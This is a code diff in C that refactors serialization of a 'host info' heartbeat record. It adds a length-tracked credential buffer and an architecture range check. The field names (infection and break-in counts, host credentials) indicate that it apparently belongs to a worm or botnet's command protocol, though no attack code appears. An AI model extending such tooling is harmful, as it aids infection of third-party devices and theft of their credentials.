@@ -55,6 +55,10 @@ prne_arch_t prne_arch_fstr (const char *str) {
 	return PRNE_ARCH_NONE;
 }
 
+bool prne_arch_inrange (const prne_arch_t x) {
+	return PRNE_ARCH_NONE < x && x < NB_PRNE_ARCH;
+}
+
 void prne_net_ep_tosin4 (const prne_net_endpoint_t *ep, struct sockaddr_in *out) {
 	memcpy(&out->sin_addr, ep->addr.addr, 4);
 	out->sin_family = AF_INET;
@@ -194,36 +198,26 @@ prne_htbt_ser_rc_t prne_dec_host_cred (const uint8_t *data, const size_t len, pr
 }
 
 void prne_htbt_init_host_info (prne_htbt_host_info_t *hi) {
-	hi->parent_uptime = 0;
-	hi->child_uptime = 0;
-	hi->bne_cnt = 0;
-	hi->infect_cnt = 0;
-	hi->parent_pid = 0;
-	hi->child_pid = 0;
-	prne_memzero(hi->prog_ver, 16);
-	prne_memzero(hi->boot_id, 16);
-	prne_memzero(hi->instance_id, 16);
-	hi->host_cred = NULL;
-	hi->crash_cnt = 0;
+	prne_memzero(hi, sizeof(prne_htbt_host_info_t));
 	hi->arch = PRNE_ARCH_NONE;
 }
 
-bool prne_htbt_alloc_host_info (prne_htbt_host_info_t *hi, const size_t cred_strlen) {
+bool prne_htbt_alloc_host_info (prne_htbt_host_info_t *hi, const size_t cred_len) {
 	void *ny_mem;
 
-	if (cred_strlen > 255) {
+	if (cred_len > 255) {
 		errno = EINVAL;
 		return false;
 	}
 
-	ny_mem = prne_alloc_str(cred_strlen);
+	ny_mem = prne_calloc(1, cred_len);
 	if (ny_mem == NULL) {
 		return false;
 	}
 
-	prne_memzero(ny_mem, cred_strlen + 1);
 	prne_free(hi->host_cred);
-	hi->host_cred = (char*)ny_mem;
+	hi->host_cred = (uint8_t*)ny_mem;
+	hi->host_cred_len = cred_len;
 
 	return true;
 }
@@ -233,6 +227,7 @@ void prne_htbt_free_host_info (prne_htbt_host_info_t *hi) {
 
 	prne_free(hi->host_cred);
 	hi->host_cred = NULL;
+	hi->host_cred_len = 0;
 }
 
 bool prne_htbt_eq_host_info (const prne_htbt_host_info_t *a, const prne_htbt_host_info_t *b) {
@@ -244,10 +239,11 @@ bool prne_htbt_eq_host_info (const prne_htbt_host_info_t *a, const prne_htbt_hos
 		a->parent_pid == b->parent_pid &&
 		a->child_pid == b->child_pid &&
 		a->arch == b->arch &&
+		a->host_cred_len == b->host_cred_len &&
 		memcmp(a->prog_ver, b->prog_ver, 16) == 0 &&
 		memcmp(a->boot_id, b->boot_id, 16) == 0 &&
 		memcmp(a->instance_id, b->instance_id, 16) == 0 &&
-		prne_nstreq(a->host_cred, b->host_cred);
+		memcmp(a->host_cred, b->host_cred, a->host_cred_len) == 0;
 }
 
 void prne_htbt_init_cmd (prne_htbt_cmd_t *cmd) {
@@ -480,14 +476,11 @@ prne_htbt_ser_rc_t prne_htbt_ser_status (uint8_t *mem, const size_t mem_len, siz
 }
 
 prne_htbt_ser_rc_t prne_htbt_ser_host_info (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_host_info_t *in) {
-	const size_t host_cred_len = prne_nstrlen(in->host_cred);
-
-	if (host_cred_len > 255) {
+	if (in->host_cred_len > 255) {
 		return PRNE_HTBT_SER_RC_FMT_ERR;
 	}
 
-	*actual = 94 + host_cred_len;
-
+	*actual = 94 + in->host_cred_len;
 	if (mem_len < *actual) {
 		return PRNE_HTBT_SER_RC_MORE_BUF;
 	}
@@ -539,9 +532,9 @@ prne_htbt_ser_rc_t prne_htbt_ser_host_info (uint8_t *mem, const size_t mem_len, 
 	mem[89] = prne_getmsb32(in->child_pid, 1);
 	mem[90] = prne_getmsb32(in->child_pid, 2);
 	mem[91] = prne_getmsb32(in->child_pid, 3);
-	mem[92] = (uint8_t)host_cred_len;
+	mem[92] = (uint8_t)in->host_cred_len;
 	mem[93] = (uint8_t)in->arch;
-	memcpy(mem + 94, in->host_cred, host_cred_len);
+	memcpy(mem + 94, in->host_cred, in->host_cred_len);
 
 	return PRNE_HTBT_SER_RC_OK;
 }
@@ -648,7 +641,6 @@ prne_htbt_ser_rc_t prne_htbt_dser_host_info (const uint8_t *data, const size_t l
 	size_t cred_size;
 
 	*actual = 94;
-
 	if (len < *actual) {
 		return PRNE_HTBT_SER_RC_MORE_BUF;
 	}
